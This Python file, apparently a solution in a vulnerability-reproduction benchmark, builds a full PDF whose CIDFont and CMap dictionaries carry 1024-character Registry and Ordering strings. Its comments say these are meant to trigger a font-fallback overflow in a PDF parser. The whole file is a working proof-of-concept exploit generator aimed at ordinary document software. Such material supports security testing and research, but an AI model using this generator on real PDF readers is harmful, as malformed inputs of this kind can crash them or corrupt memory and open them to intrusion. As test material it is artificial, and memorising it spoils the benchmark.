import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a PDF that triggers the CIDFont fallback using a very long
        # <Registry>-<Ordering> from the CIDSystemInfo dictionary.
        header = '%PDF-1.4\n'

        # Length of the long Registry and Ordering strings
        reg_len = 1024
        ord_len = 1024
        reg_str = 'R' * reg_len
        ord_str = 'O' * ord_len

        objects = []

        # 1: Catalog
        obj1 = (
            '1 0 obj\n'
            '<< /Type /Catalog /Pages 2 0 R >>\n'
            'endobj\n'
        )
        objects.append(obj1)

        # 2: Pages
        obj2 = (
            '2 0 obj\n'
            '<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n'
            'endobj\n'
        )
        objects.append(obj2)

        # 3: Page, references font F1 and content 5 0 R
        obj3 = (
            '3 0 obj\n'
            '<< /Type /Page /Parent 2 0 R '
            '/MediaBox [0 0 612 792] '
            '/Resources << /Font << /F1 4 0 R >> >> '
            '/Contents 5 0 R >>\n'
            'endobj\n'
        )
        objects.append(obj3)

        # 4: Type0 font using CIDFont 6 0 R and CMap 8 0 R
        obj4 = (
            '4 0 obj\n'
            '<< /Type /Font /Subtype /Type0 '
            '/BaseFont /Dummy '
            '/Encoding 8 0 R '
            '/DescendantFonts [6 0 R] >>\n'
            'endobj\n'
        )
        objects.append(obj4)

        # 5: Content stream that uses F1
        content_stream = 'BT /F1 12 Tf 72 712 Td (Hello World) Tj ET\n'
        stream_length = len(content_stream.encode('ascii'))
        obj5 = (
            '5 0 obj\n'
            f'<< /Length {stream_length} >>\n'
            'stream\n'
            f'{content_stream}'
            'endstream\n'
            'endobj\n'
        )
        objects.append(obj5)

        # 6: CIDFont descendant with long CIDSystemInfo (no BaseFont -> triggers fallback)
        obj6 = (
            '6 0 obj\n'
            '<< /Type /Font /Subtype /CIDFontType2 '
            '/CIDToGIDMap /Identity '
            '/DW 1000 '
            '/FontDescriptor 7 0 R '
            '/CIDSystemInfo << /Registry (' + reg_str + ') /Ordering (' + ord_str + ') /Supplement 0 >> '
            '>>\n'
            'endobj\n'
        )
        objects.append(obj6)

        # 7: FontDescriptor for the CIDFont
        obj7 = (
            '7 0 obj\n'
            '<< /Type /FontDescriptor /FontName /FOverflow '
            '/Flags 4 /ItalicAngle 0 /Ascent 1000 /Descent -200 '
            '/CapHeight 800 /StemV 80 /FontBBox [0 0 1000 1000] >>\n'
            'endobj\n'
        )
        objects.append(obj7)

        # 8: CMap object with long CIDSystemInfo as well (additional trigger surface)
        cmap_content = (
            '/CIDInit /ProcSet findresource begin\n'
            '12 dict begin\n'
            'begincmap\n'
            '/CMapName /MyCMap def\n'
            '/CMapType 2 def\n'
            '1 begincodespacerange\n'
            '<0000> <FFFF>\n'
            'endcodespacerange\n'
            '1 beginbfchar\n'
            '<0000> <0000>\n'
            'endbfchar\n'
            'endcmap\n'
            'CMapName currentdict /CMap defineresource pop\n'
            'end\n'
            'end\n'
        )
        cmap_length = len(cmap_content.encode('ascii'))
        obj8 = (
            '8 0 obj\n'
            '<< /Type /CMap '
            '/CMapName /MyCMap '
            '/CIDSystemInfo << /Registry (' + reg_str + ') /Ordering (' + ord_str + ') /Supplement 0 >> '
            f'/WMode 0 /Length {cmap_length} >>\n'
            'stream\n'
            f'{cmap_content}'
            'endstream\n'
            'endobj\n'
        )
        objects.append(obj8)

        # Compute xref offsets
        offsets = [0]  # object 0 (free)
        current = len(header.encode('ascii'))

        for obj in objects:
            offsets.append(current)
            current += len(obj.encode('ascii'))

        xref_offset = current

        # Build xref table
        xref_lines = ['xref', f'0 {len(offsets)}']
        xref_lines.append('0000000000 65535 f ')
        for i in range(1, len(offsets)):
            xref_lines.append(f'{offsets[i]:010d} 00000 n ')
        xref_str = '\n'.join(xref_lines) + '\n'

        # Trailer
        trailer = (
            'trailer\n'
            f'<< /Size {len(offsets)} /Root 1 0 R >>\n'
            'startxref\n'
            f'{xref_offset}\n'
            '%%EOF\n'
        )

        pdf_str = header + ''.join(objects) + xref_str + trailer
        return pdf_str.encode('latin-1')